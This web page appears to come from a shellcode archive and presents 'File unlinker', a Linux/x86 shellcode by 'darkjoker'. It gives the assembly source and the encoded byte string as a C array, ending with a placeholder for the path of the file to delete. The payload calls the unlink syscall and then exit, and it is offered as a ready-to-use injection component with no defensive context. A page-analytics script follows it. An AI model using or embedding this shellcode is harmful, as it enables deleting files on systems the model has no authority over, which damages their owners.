<html><head><title>Linux/x86 - File unlinker 18 bytes + file path length</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
Author    : darkjoker
Site      : http://darkjoker.net23.net
Shellcode : linux/x86 File unlinker 18 bytes + file path length

        .global _start
_start:
        jmp     one

two:
        pop     %ebx
        movb    $0xa,%al
        int     $0x80

        movb    $0x1, %al
        xor     %ebx, %ebx
        int     $0x80

one:
        call    two
        .string &quot;file&quot;
*/

char main [] =
&quot;\xeb\x0b\x5b\xb0\x0a\xcd\x80\xb0&quot;
&quot;\x01\x31\xdb\xcd\x80\xe8\xf0\xff&quot;
&quot;\xff\xff&quot;
&quot;file&quot; //Here file path to delete


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
